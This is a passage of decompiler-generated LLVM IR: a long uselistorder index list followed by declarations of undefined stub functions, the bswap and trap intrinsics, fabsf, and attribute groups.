602, 603, 2090, 52, 2095, 606, 73, 422, 2096, 2102, 605, 2097, 2098, 2099, 2100, 2101, 373, 2103, 607, 455, 2104, 2105, 604, 2106, 608, 2107, 2108, 609, 204, 611, 74, 423, 142, 456, 2109, 612, 2110, 610, 2111, 2112, 613, 75, 424, 614, 2113, 2114, 615, 2115, 2116, 425, 617, 618, 616, 619, 334, 2117, 2118, 76, 109, 426, 427, 428, 2120, 620, 402, 1818, 1819, 621, 622, 623, 1922, 1923, 1924, 1925, 1926, 1927, 1928, 1929, 1930, 1931, 1932, 1933, 631, 632, 1934, 1935, 633, 634, 624, 635, 630, 377, 626, 1936, 627, 1937, 628, 629, 1887, 2136, 376, 625, 374, 375, 636, 637, 638, 457, 390, 2137, 2138, 429, 640, 641, 642, 643, 644, 639, 378, 645, 2139, 646, 458, 2140, 119, 379, 335, 77, 78, 647, 336, 2142, 430, 431, 432, 433, 654, 2143, 2145, 2146, 2147, 649, 2148, 650, 651, 652, 648, 380, 653, 2144, 459, 656, 657, 655, 434, 32, 659, 658, 660, 2150, 435, 436, 437, 438, 2152, 663, 661, 662, 381, 2153, 664, 2154, 439, 2691, 665, 666, 2692, 79, 672, 80, 671, 667, 2695, 670, 383, 673, 668, 2696, 669, 382, 674, 81, 110, 2697, 440, 677, 678, 2698, 679, 2703, 680, 2702, 682, 683, 681, 2710, 2711, 460, 2712, 2713, 205, 2714, 82, 461, 2716, 384, 684, 685, 686, 687, 2718, 2719, 403, 688, 2728, 2729, 689, 2730, 690, 2731, 2732, 691, 206, 692, 693, 694, 695, 696, 2802, 207, 83, 391, 385, 443, 444, 2792, 2793, 2794, 386, 441, 442, 445, 2795, 2796, 446, 2797, 2798, 388, 84, 208, 209, 387, 2800, 2801, 462, 210, 85, 697, 2799, 2803, 2804, 447, 448, 1948, 449, 450, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 1342, 1343, 1344, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 1378, 1379, 1380, 1381, 1382, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 1408, 1409, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 1420, 1421, 1422, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 1437, 1438, 1439, 1440, 1441, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1452, 1453, 1454, 1455, 1456, 1457, 1458, 1459, 1460, 1461, 1462, 1463, 1464, 1465, 1466, 1467, 1468, 1469, 1470, 1471, 1472, 1473, 1474, 1475, 1476, 1477, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 1488, 1489, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 1499, 1500, 1501, 1502, 1503, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 1532, 1533, 1534, 1535, 1536, 1537, 1538, 1539, 1540, 1541, 1542, 1543, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 1553, 1554, 1555, 1556, 1557, 1558, 1559, 1560, 1561, 1562, 1563, 1564, 1565, 1566, 1567, 1568, 1569, 1570, 1571, 1572, 1573, 1574, 1575, 1576, 1577, 1578, 1579, 1580, 1581, 1582, 1583, 1584, 1585, 1586, 1587, 1588, 1589, 1590, 1591, 1592, 1593, 1594, 1595, 1596, 1597, 1598, 1599, 1600, 1601, 1602, 1603, 1604, 1605, 1606, 1607, 1608, 1609, 1610, 1611, 1612, 1613, 1614, 1615, 1616, 1617, 1618, 1619, 1620, 1621, 1622, 1623, 1624, 1625, 1626, 1627, 1628, 1629, 1630, 1631, 1632, 1633, 1634, 1635, 1636, 1637, 1638, 1639, 1640, 1641, 1642, 1643, 1644, 1645, 1646, 1647, 1648, 1649, 1650, 1651, 1652, 1653, 1654, 1655, 1656, 1657, 1658, 1659, 1660, 1661, 1662, 1663, 1664, 1665, 1666, 1667, 1668, 1669, 1670, 1671, 1672, 1673, 1674, 1675, 1676, 1677, 1678, 1679, 1680, 1681, 1682, 1683, 1684, 1685, 1686, 1687, 1688, 1689, 1690, 1691, 1692, 1693, 1694, 1695, 1696, 1697, 1698, 1699, 1700, 1701, 1702, 1703, 1704, 1705, 1706, 1707, 1708, 1709, 1710, 1711, 1712, 1713, 1714, 1715, 1716, 1717, 1718, 1719, 1720, 1721, 1722, 1723, 1724, 1725, 1726, 1727, 1728, 1729, 1730, 1731, 1732, 1733, 1734, 1735, 1736, 1737, 1738, 1739, 1740, 1741, 1742, 1743, 1744, 1745, 1746, 1747, 1748, 1749, 1750, 1751, 1752, 1753, 1754, 1755, 1756, 1757, 1758, 1759, 1760, 1761, 1762, 1763, 1764, 1765, 1766, 1767, 1768, 1769, 1770, 1771, 1772, 1773, 1774, 1775, 1776, 1777, 1778, 1779, 1780, 1781, 1782, 1783, 1784, 1785, 1786, 1787, 1788, 1789, 1790, 1791, 1792, 1793, 1794, 1795, 1796, 1797, 1798, 1799, 1800, 1801, 1802, 1803, 1804, 1805, 1806, 1807, 1808, 1809, 1810, 1811, 1812, 1813, 1814, 1815, 1816, 1817, 1820, 1821, 1822, 1823, 1824, 1825, 1826, 1827, 1828, 1829, 1830, 1831, 1832, 1833, 1834, 1835, 1836, 1837, 1838, 1839, 1840, 1841, 1842, 1843, 1844, 1845, 1846, 1847, 1848, 1849, 1850, 1851, 1852, 1853, 1854, 1855, 1856, 1857, 1858, 1859, 1860, 1861, 1862, 1863, 1864, 1865, 1866, 1867, 1868, 1869, 1870, 1871, 1872, 1873, 1874, 1875, 1876, 1877, 1878, 1879, 1880, 1881, 1882, 1883, 1884, 1885, 1886, 2945, 2946, 2947, 2948, 2949, 2950, 2951, 2952, 2953, 2954, 2955, 2956, 2957, 2958, 2959 }
  uselistorder i32* @r4, {}
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
